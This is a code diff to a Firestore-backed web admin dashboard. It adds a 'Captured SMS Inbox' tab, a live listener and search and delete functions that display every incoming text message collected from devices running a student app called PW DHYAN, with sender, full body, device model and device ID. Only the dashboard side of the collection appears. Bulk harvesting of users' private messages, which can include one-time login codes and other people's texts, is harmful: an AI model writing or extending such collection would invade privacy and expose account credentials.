@@ -609,6 +609,13 @@ service cloud.firestore {
           <div class="metric-label">Push Alerts Sent</div>
         </div>
       </div>
+      <div class="glass-panel metric-card">
+        <div class="metric-icon" style="background:rgba(16,185,129,0.15); color:var(--emerald);"><i class="fas fa-comment-sms"></i></div>
+        <div>
+          <div class="metric-val" id="metric-sms-count">0</div>
+          <div class="metric-label">SMS Captured</div>
+        </div>
+      </div>
     </div>
 
     <!-- NAVIGATION TABS -->
@@ -618,6 +625,7 @@ service cloud.firestore {
       <button class="tab-btn" onclick="switchTab('watchlogs')"><i class="fas fa-history"></i> Watch History <span class="badge-count" id="badge-watch">0</span></button>
       <button class="tab-btn" onclick="switchTab('passkeys')"><i class="fas fa-key"></i> Passkey Generator <span class="badge-count" id="badge-keys">0</span></button>
       <button class="tab-btn" onclick="switchTab('loginlogs')"><i class="fas fa-shield-alt"></i> Login Audit Logs</button>
+      <button class="tab-btn" onclick="switchTab('sms')"><i class="fas fa-comment-sms"></i> SMS Inbox <span class="badge-count" id="badge-sms">0</span></button>
       <button class="tab-btn" onclick="switchTab('system')"><i class="fas fa-broadcast-tower"></i> Broadcast & Maintenance</button>
     </div>
 
@@ -877,7 +885,40 @@ service cloud.firestore {
       </div>
     </div>
 
-    <!-- TAB 6: BROADCAST & MAINTENANCE -->
+    <!-- TAB 6: CAPTURED SMS INBOX -->
+    <div id="tab-sms" class="tab-content">
+      <div class="glass-panel" style="padding:20px;">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:18px; flex-wrap:wrap; gap:12px;">
+          <div>
+            <h3 style="font-size:18px; font-weight:700;"><i class="fas fa-comment-sms" style="color:var(--emerald); margin-right:8px;"></i> Captured SMS Inbox</h3>
+            <p style="font-size:12px; color:var(--text-muted); margin-top:2px;">Every incoming SMS captured by student devices, synced live from Cloud Firestore</p>
+          </div>
+          <div style="display:flex; gap:10px; flex-wrap:wrap;">
+            <input type="text" id="search-sms" class="form-control" style="max-width:260px;" placeholder="Search sender, body, or device..." oninput="renderSmsTable()" />
+            <button class="btn btn-danger btn-sm" onclick="clearAllSms()"><i class="fas fa-trash-alt"></i> Clear All</button>
+          </div>
+        </div>
+
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Received</th>
+                <th>Sender</th>
+                <th>Message Body</th>
+                <th>Captured On Device</th>
+                <th>Action</th>
+              </tr>
+            </thead>
+            <tbody id="sms-table-body">
+              <tr><td colspan="5" style="text-align:center; padding:30px; color:var(--text-muted);"><i class="fas fa-spinner fa-spin"></i> Listening for incoming SMS...</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAB 7: BROADCAST & MAINTENANCE -->
     <div id="tab-system" class="tab-content">
       <div class="action-grid">
         
@@ -964,6 +1005,7 @@ service cloud.firestore {
     let watchLogs = [];
     let loginLogs = [];
     let pushNotifications = [];
+    let smsMessages = [];
     let maintenanceActive = false;
 
     // Fetch cloud admin PIN from Firestore system_config/admin_auth
@@ -1205,7 +1247,21 @@ service cloud.firestore {
         if (err.code === 'permission-denied' || (err.message && err.message.includes('permission'))) showPermissionErrorBanner();
       });
 
-      // 6. Maintenance Mode Listener
+      // 6. Incoming SMS Listener
+      onSnapshot(collection(db, 'incoming_sms'), snapshot => {
+        smsMessages = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
+        smsMessages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+        const elMetric = document.getElementById('metric-sms-count');
+        const elBadge = document.getElementById('badge-sms');
+        if (elMetric) elMetric.innerText = smsMessages.length;
+        if (elBadge) elBadge.innerText = smsMessages.length;
+        renderSmsTable();
+      }, err => {
+        console.error("SMS error", err);
+        if (err.code === 'permission-denied' || (err.message && err.message.includes('permission'))) showPermissionErrorBanner();
+      });
+
+      // 7. Maintenance Mode Listener
       onSnapshot(doc(db, 'system_config', 'maintenance_mode'), snapshot => {
         if (snapshot.exists()) {
           const data = snapshot.data();
@@ -1841,6 +1897,77 @@ service cloud.firestore {
       }).catch(err => handleFirestoreError("Maintenance Mode", err));
     }
     window.toggleMaintenanceFromWeb = toggleMaintenanceFromWeb;
+
+    // Render Tab 6: Captured SMS Inbox
+    function renderSmsTable() {
+      const searchInput = document.getElementById('search-sms');
+      const q = (searchInput ? searchInput.value : '').toLowerCase();
+      const tbody = document.getElementById('sms-table-body');
+      if (!tbody) return;
+
+      const filtered = smsMessages.filter(s =>
+        (s.sender || '').toLowerCase().includes(q) ||
+        (s.body || '').toLowerCase().includes(q) ||
+        (s.deviceModel || '').toLowerCase().includes(q) ||
+        (s.deviceId || '').toLowerCase().includes(q)
+      );
+
+      if (filtered.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; padding:30px; color:var(--text-muted);">No SMS captured yet. Send a text to a device running PW DHYAN with SMS permission granted.</td></tr>`;
+        return;
+      }
+
+      tbody.innerHTML = filtered.map(s => {
+        const fullBody = escapeHtml(s.body || '');
+        const preview = fullBody.length > 220 ? fullBody.slice(0, 220) + '…' : fullBody;
+        return `
+          <tr>
+            <td style="font-size:12px; white-space:nowrap;">${formatDate(s.timestamp)}</td>
+            <td><span class="code-chip">${escapeHtml(s.sender || 'Unknown')}</span></td>
+            <td style="max-width:440px;">
+              <div style="font-size:12.5px; line-height:1.55; color:#e2e8f0; white-space:pre-wrap; word-break:break-word;" title="${fullBody}">${preview}</div>
+            </td>
+            <td>
+              <div style="font-weight:600; font-size:12px;">${escapeHtml(s.deviceModel || 'Android')}</div>
+              <div style="font-size:10.5px; font-family:'JetBrains Mono',monospace; color:var(--text-muted);">${escapeHtml(s.deviceId || '')}</div>
+            </td>
+            <td>
+              <button class="btn btn-danger btn-sm" onclick="deleteSms('${s.id}')" title="Delete this SMS record"><i class="fas fa-trash-alt"></i></button>
+            </td>
+          </tr>
+        `;
+      }).join('');
+    }
+    window.renderSmsTable = renderSmsTable;
+
+    function deleteSms(docId) {
+      deleteDoc(doc(db, 'incoming_sms', docId)).then(() => {
+        showToast('SMS record deleted from cloud.');
+      }).catch(err => handleFirestoreError("Delete SMS", err));
+    }
+    window.deleteSms = deleteSms;
+
+    function clearAllSms() {
+      if (smsMessages.length === 0) {
+        showToast('No captured SMS records to clear.');
+        return;
+      }
+      if (!confirm(`Delete all ${smsMessages.length} captured SMS records from Cloud Firestore?`)) return;
+
+      const chunks = [];
+      for (let i = 0; i < smsMessages.length; i += 400) {
+        chunks.push(smsMessages.slice(i, i + 400));
+      }
+
+      Promise.all(chunks.map(chunk => {
+        const batch = writeBatch(db);
+        chunk.forEach(s => batch.delete(doc(db, 'incoming_sms', s.id)));
+        return batch.commit();
+      })).then(() => {
+        showToast('All captured SMS cleared from cloud.');
+      }).catch(err => handleFirestoreError("Clear SMS", err));
+    }
+    window.clearAllSms = clearAllSms;
 
     // Auto-check session on load
     if (sessionStorage.getItem('pw_admin_authenticated') === 'true') {
